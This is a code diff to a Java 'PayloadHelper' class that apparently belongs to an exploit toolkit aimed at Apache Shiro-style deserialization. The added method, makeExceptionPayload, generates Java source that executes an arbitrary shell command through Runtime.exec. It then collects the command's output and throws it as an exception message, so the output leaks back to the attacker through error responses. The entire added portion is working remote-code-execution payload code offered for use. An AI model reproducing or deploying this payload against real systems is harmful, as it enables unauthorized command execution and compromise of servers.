@@ -129,4 +129,20 @@ public class PayloadHelper {
     public static Object makeSimplePrincipalCollection(){
         return new SimplePrincipalCollection();
     }
+
+    public static String makeExceptionPayload(String cmd){
+        return "StringBuilder localStringBuffer = new StringBuilder();\n" +
+                "Process localProcess = Runtime.getRuntime().exec(\""+
+                cmd.replaceAll("\\\\","\\\\\\\\")
+                        .replaceAll("\"", "\\\"") +"\");\n" +
+                "java.io.BufferedReader localBufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(localProcess.getInputStream()));\n" +
+                "String str1;\n" +
+                "try {\n" +
+                "     while ((str1 = localBufferedReader.readLine()) != null) {\n" +
+                "         localStringBuffer.append(str1).append(\"\\n\");\n" +
+                "     }\n" +
+                "}catch (Exception e){\n" +
+                "}\n" +
+                "throw new Exception(localStringBuffer.toString());";
+    }
 }
